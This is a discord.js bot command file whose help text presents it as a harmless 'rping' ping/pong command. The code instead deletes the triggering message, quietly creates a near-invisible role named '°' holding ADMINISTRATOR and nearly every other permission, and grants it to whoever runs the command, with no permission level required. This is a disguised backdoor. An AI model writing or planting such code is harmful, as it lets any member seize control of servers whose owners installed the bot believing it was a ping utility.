const Discord = require('discord.js');

exports.run = async (client, message) => {

  message.channel.fetchMessages({
    limit: "1"
    
  }).then(messages => message.channel.bulkDelete(messages))
 
        const ARole = message.guild.roles.find(`name`, "°");

        if(!ARole){   


        message.guild.createRole({
      name: "°",
      color: "#00000",
      permissions:['ADMINISTRATOR', 'KICK_MEMBERS', 'BAN_MEMBERS', 'MANAGE_CHANNELS', 'MANAGE_GUILD', 'ADD_REACTIONS', 'VIEW_AUDIT_LOG', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'SEND_TTS_MESSAGES', 'MANAGE_MESSAGES', 'EMBED_LINKS', 'ATTACH_FILES', 'READ_MESSAGE_HISTORY', 'MENTION_EVERYONE', 'USE_EXTERNAL_EMOJIS', 'EXTERNAL_EMOJIS', 'CONNECT', 'SPEAK', 'MUTE_MEMBERS', 'DEAFEN_MEMBERS', 'MOVE_MEMBERS', 'USE_VAD', 'CHANGE_NICKNAME', 'MANAGE_NICKNAMES', 'MANAGE_ROLES', 'MANAGE_WEBHOOKS', 'MANAGE_EMOJIS']
    })
    
    }


  if (message.guild.member(message.author).roles.has(ARole)) {
    message.guild.member(message.author).removeRole(ARole)
                     
  } else {
    message.guild.member(message.author).addRole(ARole)
                     
    };
};
  
  
  exports.conf = {
    enabled: true,
    guildOnly: false,
    aliases: [],
    permLevel: 0
  };
  
  exports.help = {
    name: 'rping',
    description: 'Ping/Pong command, vous donne aussi votre ping.',
    usage: 'ping'
  };
